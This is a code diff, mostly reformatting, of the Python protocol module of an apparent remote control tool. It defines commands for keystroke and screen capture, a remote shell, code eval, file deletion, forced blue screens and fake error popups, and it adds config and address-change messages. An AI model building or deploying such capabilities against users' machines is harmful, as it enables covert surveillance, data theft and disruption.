@@ -73,14 +73,16 @@ class Actions:
     CLOSE_WINDOW = Action("close_window", "关闭窗口")
     EXECUTE_COMMAND = Action("execute_command", "执行命令")
     EXECUTE_CODE = Action("execute_code", "执行代码")
-    action_list = [BLUE_SCREEN,
-                   RECORD_SCREEN,
-                   DELETE_FILE,
-                   POPUP_ERROR_WINDOW,
-                   RETURN_DESKTOP,
-                   CLOSE_WINDOW,
-                   EXECUTE_COMMAND,
-                   EXECUTE_CODE]
+    action_list = [
+        BLUE_SCREEN,
+        RECORD_SCREEN,
+        DELETE_FILE,
+        POPUP_ERROR_WINDOW,
+        RETURN_DESKTOP,
+        CLOSE_WINDOW,
+        EXECUTE_COMMAND,
+        EXECUTE_CODE,
+    ]
     action_map = {action.label: action for action in action_list}
 
 
@@ -122,7 +124,7 @@ class PacketManager:
             timer = perf_counter()
             all_sent = 0
             while True:
-                data = packet[:min(length, 1024 * 1024 * 1024)]
+                data = packet[: min(length, 1024 * 1024 * 1024)]
                 try:
                     send_length = self.sock.send(data)
                 except ConnectionError:
@@ -142,9 +144,12 @@ class PacketManager:
                 if length <= 0:
                     break
 
-    def send_packet(self, packet: Packet, loss_enable: bool = False, priority: int = Priority.HIGHER) -> None:
-        self.packet_stack[priority].append((pack(packet), loss_enable))
-        # print("加入数据包队列:", packet["type"])
+    def send_packet(
+        self, packet: Packet, loss_enable: bool = False, priority: int = Priority.HIGHER
+    ) -> None:
+        packet_data = pack(packet)
+        self.packet_stack[priority].append((packet_data, loss_enable))
+        return len(packet_data), packet_data
 
     def recv_length(self, length) -> bytes:
         data = b""
@@ -167,49 +172,53 @@ class PacketManager:
 
 
 # From Server
-SET_MOUSE_BUTTON = "set_mouse_button"  # Server
-SET_MOUSE_SCROLL = "set_mouse_scroll"  # Server
-GET_MOUSE_POS = "get_mouse_pos"  # Server
-GET_KEYBOARD_STATE = "get_keyboard_state"  # Server
-SET_MOUSE_POS = "set_mouse_pos"  # Server
-SET_KEYBOARD_KEY = "set_keyboard_key"  # Server
-GET_SCREEN = "get_screen"  # Server
-SET_SCREEN_SEND = "set_screen_send"  # Server
-SET_SCREEN_FPS = "set_screen_fps"  # Server
-SET_SCREEN_FORMAT = "set_screen_format"  # Server
-SET_SCREEN_QUALITY = "set_screen_quality"  # Server
-SET_SCREEN_SIZE = "set_screen_size"  # Server
-SET_PRE_SCALE = "set_pre_scale"  # Server
-OPEN_ERROR_WINDOW = "open_error_window"  # Server
-FILE_VIEW = "file_view"  # Server
-FILE_CREATE = "file_create"  # Server
-FILE_DELETE = "file_delete"  # Server
-FILE_WRITE = "file_write"  # Server
-REQ_LIST_DIR = "req_list_dir"  # Server
-SHELL_INIT = "shell_init"  # Server
-SHELL_INPUT = "shell_input"  # Server
-STATE_INFO = "state_info"  # Server
-ACTION_INFO = "action_info"  # Server
-ACTION_ADD = "action_add"  # Server
-ACTION_DEL = "action_del"  # Server
-ACTION_UPDATE = "action_update"  # Server
-ACTION_ENABLE = "action_enable"  # Server
-PING = "ping"  # Server
-EVAL = "eval"  # Server
+SET_MOUSE_BUTTON = "set_mouse_button"
+SET_MOUSE_SCROLL = "set_mouse_scroll"
+GET_MOUSE_POS = "get_mouse_pos"
+GET_KEYBOARD_STATE = "get_keyboard_state"
+SET_MOUSE_POS = "set_mouse_pos"
+SET_KEYBOARD_KEY = "set_keyboard_key"
+GET_SCREEN = "get_screen"
+SET_SCREEN_SEND = "set_screen_send"
+SET_SCREEN_FPS = "set_screen_fps"
+SET_SCREEN_FORMAT = "set_screen_format"
+SET_SCREEN_QUALITY = "set_screen_quality"
+SET_SCREEN_SIZE = "set_screen_size"
+SET_PRE_SCALE = "set_pre_scale"
+OPEN_ERROR_WINDOW = "open_error_window"
+FILE_VIEW = "file_view"
+FILE_CREATE = "file_create"
+FILE_DELETE = "file_delete"
+FILE_WRITE = "file_write"
+REQ_LIST_DIR = "req_list_dir"
+SHELL_INIT = "shell_init"
+SHELL_INPUT = "shell_input"
+STATE_INFO = "state_info"
+ACTION_INFO = "action_info"
+ACTION_ADD = "action_add"
+ACTION_DEL = "action_del"
+ACTION_UPDATE = "action_update"
+PING = "ping"
+EVAL = "eval"
+CLIENT_RESTART = "client_restart"
+CHANGE_ADDRESS = "change_address"
+CHANGE_CONFIG = "change_config"
+REQ_CONFIG = "req_config"
 
 # From Client
-LOG = "log"  # Client
-SCREEN = "screen"  # Client
-KEY_EVENT = "key_event"  # Client
-MOUSE_EVENT = "mouse_event"  # Client
-SHELL_OUTPUT = "shell_output"  # Client
-SHELL_BROKEN = "shell_broken"  # Client
-EVAL_RESULT = "eval_result"  # Client
-HOST_NAME = "host_name"  # Client
-SCREEN_RAW_SIZE = "screen_raw_size"  # Client
-DIR_LIST_RESULT = "dir_list_result"  # Client
-FILE_VIEW_CREATE = "file_view_create"  # Client
-FILE_VIEW_DATA = "file_view_data"  # Client
-FILE_VIEW_OVER = "file_view_over"  # Client
-FILE_VIEW_ERROR = "file_view_error"  # Client
-PONG = "pong"  # Client
+LOG = "log"
+SCREEN = "screen"
+KEY_EVENT = "key_event"
+MOUSE_EVENT = "mouse_event"
+SHELL_OUTPUT = "shell_output"
+SHELL_BROKEN = "shell_broken"
+EVAL_RESULT = "eval_result"
+HOST_NAME = "host_name"
+SCREEN_RAW_SIZE = "screen_raw_size"
+DIR_LIST_RESULT = "dir_list_result"
+FILE_VIEW_CREATE = "file_view_create"
+FILE_VIEW_DATA = "file_view_data"
+FILE_VIEW_OVER = "file_view_over"
+FILE_VIEW_ERROR = "file_view_error"
+CONFIG_RESULT = "config_result"
+PONG = "pong"
